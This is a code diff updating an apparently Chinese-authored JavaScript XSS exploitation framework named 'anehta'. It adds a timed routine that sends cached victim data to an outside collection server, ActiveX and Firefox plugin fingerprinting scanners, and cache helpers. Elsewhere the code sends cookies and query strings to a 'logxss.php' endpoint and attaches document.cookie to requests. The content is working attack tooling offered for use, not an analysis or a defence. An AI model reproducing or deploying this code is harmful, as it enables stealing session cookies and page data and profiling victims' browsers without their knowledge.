@@ -4,14 +4,13 @@
 //// 定义常量
 //////////////////////////////////////////////////
 var anehta = {
-        version: '0.4.1',
-        author: 'axis',
-        contact: 'axis@ph4nt0m.org',
-        homepage: 'http://www.ph4nt0m.org',
-        blog: 'http://hi.baidu.com/aullik5',
-        projecthome: 'http://anehta.googlecode.com'};
+        Version: '0.5.2',
+        Author: 'axis',
+        Contact: 'axis@ph4nt0m.org',
+        Homepage: 'http://www.ph4nt0m.org',
+        Blog: 'http://hi.baidu.com/aullik5',
+        projectHome: 'http://anehta.googlecode.com'};
 
-var isBaseLibLoaded = "true";
 var anehtaurl = "http://www.secwiki.com/anehta";
 var feedurl = anehtaurl+"/feed.js";
 var logurl = anehtaurl+"/logxss.php?";  // cookie 和 querystring 收集
@@ -23,11 +22,22 @@ var XssInfo_E = " ****]\r\n";
 
 
 //////////////////////////////////////////////////
-//// 定义全局变量
+//// 定义全局变量和常量
 //////////////////////////////////////////////////
 var $d=document;
 
 
+// 定义签名
+anehta.signatures = new Object();
+
+// activex 签名
+anehta.signatures.activex = new Array(
+  "Flash Player 8|ShockwaveFlash.ShockwaveFlash.8|classID",
+  "Flash Player 9|ShockwaveFlash.ShockwaveFlash.9|classID",
+  "",
+  "",
+  ""
+);
  
 
 //////////////////////////////////////////////////
@@ -64,7 +74,7 @@ Usage:
     	- Retrieve an item from cache: var theValue = cache.getItem(theKey);
     	- Empty the cache: cache.clear();
     	- cache.removeItem(theKey);
-    	- cache.overwriteItem(theKey);
+    	- cache.addItem(theKey, the Value);
     	- cache.dropItem(theKey);
     	- cache.hasItem(theKey);
     	- ...
@@ -103,7 +113,7 @@ anehta.core.cache = function(){
 	 * @param 	string Value of the item
 	 * @return	string Value of the item
 	 */
-	this.setItem = function(pKey, pValue)
+	this.addItem = function(pKey, pValue)
 	{
 		if (typeof(pValue) != 'undefined') 
 		{
@@ -178,15 +188,34 @@ anehta.core.cache = function(){
 		return this.items[pKey];
 	}
 	
-	// removeItem()有问题，不能正常工作
-	this.overwriteItem = function(pKey, pValue)
+	// 覆盖或者添加一个值
+	this.setItem = function(pKey, pValue)
 	{
 		if(this.hasItem(pKey) == true){ // 有则覆盖
 			this.items[pKey] = pValue; // 覆盖值
 		}
 		else { // 没有则添加
-			this.setItem(pKey, pValue);
+			this.addItem(pKey, pValue);
 		} 
+	}
+	
+	// 给指定key对应的值append一个值
+	this.appendItem = function(pKey, pValue){
+		if(this.hasItem(pKey) == true){ // 有则append
+			var key_tmp;
+			key_tmp = this.getItem(pKey); // 保存原来的值
+			key_tmp = key_tmp + pValue; // append新的值
+			this.setItem(pKey, key_tmp); // 覆盖key对应的值为新的值			
+		} else { // 找不到指定值, 创建一个新的
+			this.setItem(pKey, pValue);			
+		}
+	}
+	
+	// 克隆一个cache对象
+	this.clone = function(){
+		var clone;
+		clone = this;
+		return clone;		
 	}
 	
 	//获取所有的key值; 包括被drop的，都会显示出来
@@ -464,7 +493,7 @@ anehta.logger = {};
 
 anehta.logger.logInfo = function(param){
 	param = NoCryptMark + XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
-	        XssInfo_S + "Info: " + param +XssInfo_E;
+          XssInfo_S + "Info: " + param + XssInfo_E;
 	param = escape(param);
 	anehta.net.getURL(logurl+param);
 }
@@ -518,6 +547,37 @@ anehta.logger.logForm = function(o) {
 	anehta.core.freeze(300);	
 	//return false;
 } 
+
+// 定期检查client cache,并把其中的信息发送到server
+anehta.logger.logCache = function(){
+	var interval = 5000; // 检查的频率
+	var cache_tmp = "";
+	setInterval(function(){		
+		// 正常记录cache里数据
+		var keys = anehtaCache.showKeys();
+	    if (keys != null){ // cache里有东西
+	    	var cache = "";
+		    for (i=0; i<keys.length; i++) {
+		     	if (anehtaCache.hasItem(keys[i]) == true){
+		     		cache = cache + "\r\n" + XssInfo_S + keys[i] + ": " + anehtaCache.getItem(keys[i]) + XssInfo_E;
+		     	}
+		    }
+		    //alert(cache_tmp);
+		    if(cache != cache_tmp){ // 有变化才发送,没有变化不发送
+		    //if(cache != ""){ // 有记录才发送,没有记录不发送
+		    	try {
+		    		// 如果cache太长会导致请求失败
+		        anehta.logger.logInfo(cache); 
+		        //anehtaCache.clear(); 
+		        cache_tmp = cache; // 把当前cache保存在cache_tmp 中
+		      } catch (e) {
+		      	//alert(e);
+		      }
+		    }
+	    }
+	  },
+	  interval);
+}
 
 
 //////////////////////////////////////////////////
@@ -619,9 +679,9 @@ anehta.ajax.XmlHttp = function() {
 				o.open("GET", url, true);
 				setRequestHeaders(headers);
 				o.onreadystatechange = function() { readyStateChange(processResponse); };
-				// 自动带上当前cookie
+				// 自动带上当前cookie, 对FF有效
 				o.setRequestHeader("Cookie", document.cookie);
-				o.send();
+				o.send(null); // FF里函数一定要带参数,否则函数会不执行
 				return true;
 			} catch (ex) {
 				return false;
@@ -693,12 +753,12 @@ anehta.ajax.post = function(url, param){
 	xmlhttp.post(url, param, null, function(response, responseHeaders) {
 		 if (responseHeaders != null) {
 			 //alert(responseHeaders);
-			 anehtaCache.overwriteItem("ajaxPostResponseHeaders", responseHeaders);
+			 anehtaCache.setItem("ajaxPostResponseHeaders", responseHeaders);
 		 }
     
 		 if (response != null) {
 			 //alert(response);
-			 anehtaCache.overwriteItem("ajaxPostResponse", response);
+			 anehtaCache.setItem("ajaxPostResponse", response);
 		 }		    
 	 });
 }
@@ -709,12 +769,12 @@ anehta.ajax.get = function(url){
 	xmlhttp.get(url, null, function(response, responseHeaders) {
 		if (responseHeaders != null) {
 			//alert(responseHeaders);
-			anehtaCache.overwriteItem("ajaxGetResponseHeaders", responseHeaders);
+			anehtaCache.setItem("ajaxGetResponseHeaders", responseHeaders);
 		}
     
 		if (response != null) {
 			//alert(response);
-			anehtaCache.overwriteItem("ajaxGetResponse", response);
+			anehtaCache.setItem("ajaxGetResponse", response);
 		}
 	});
 } 
@@ -952,7 +1012,7 @@ anehta.detect.flash = function(targetVersion){
 		try {
 			FlashDetector_Version = "ShockwaveFlash.ShockwaveFlash." + targetVersion;
 		  FlashObj = new ActiveXObject(FlashDetector_Version);
-		  anehtaCache.overwriteItem("FlashVer", FlashDetector_Version); // 保存到cache中		  
+		  anehtaCache.setItem("FlashVer", FlashDetector_Version); // 保存到cache中		  
 		  playable = true;
 		} catch (e){
 			return playable;
@@ -1011,20 +1071,28 @@ anehta.detect.httponly = function(){
 	
 }
 
-anehta.detect.activex = function(){
-	
+anehta.detect.activex = function(objName){ // 需要指定object name
+	try {
+		  var Obj = new ActiveXObject(objName);
+		  return true;
+  } catch (e){
+			return false;
+  }
 }
 
-anehta.detect.ffplugin = function (){
-
+anehta.detect.ffplugin = function(pluginName){
+	if (anehtaBrowser.type() == "mozilla"){ 
+	  var allplugins;
+	  allplugins = anehta.scanner.ffplugins();
+	  if ( allplugins.indexOf(pluginName) > -1 ){ // 找到了
+	  	return true;
+	  }
+  }
+  return false;
 }
 
 anehta.detect.ffextension = function (){
 
-}
-
-anehta.detect.noscript = function (){
-	
 }
 
 
@@ -1033,13 +1101,43 @@ anehta.detect.noscript = function (){
 //////////////////////////////////////////////////
 anehta.scanner = {};
 
-anehta.scanner.history = function(){
-	
+
+// 扫描签名中定义好的activex
+anehta.scanner.activex = function(){
+	if (anehtaBrowser.type() == "msie"){
+	  var objtmp;
+	  for (i=0; i<anehta.signatures.activex.length; i++){
+		  objtmp = anehta.signatures.activex[i].split('|'); // 分隔符是"|"
+		  if ( anehta.detect.activex(objtmp[1]) == true ){
+			  anehtaCache.appendItem("Activex", "|"+objtmp[0]+": "+objtmp[1]); // 保存到cache中		  
+		  }
+	  }
+	  return anehtaCache.getItem("Activex");
+  } else {  // 非IE
+  	return false;
+  }
+}
+
+anehta.scanner.ffplugins = function (){  
+	if (anehtaBrowser.type() == "mozilla"){ 
+    for (var i = 0; i < navigator.plugins.length; i++) {
+  	  // 用"|"作为分隔符
+      anehtaCache.appendItem("FirefoxPlugins" , "|"+navigator.plugins[i].name);
+    }        
+    return anehtaCache.getItem("FirefoxPlugins");
+  } else { // 非mozilla浏览器
+    	return false;
+  }
 }
 
 anehta.scanner.port = function(){
 	
 }
+
+anehta.scanner.history = function(){
+	
+}
+
 
 anehta.scanner.online = function(){
 	
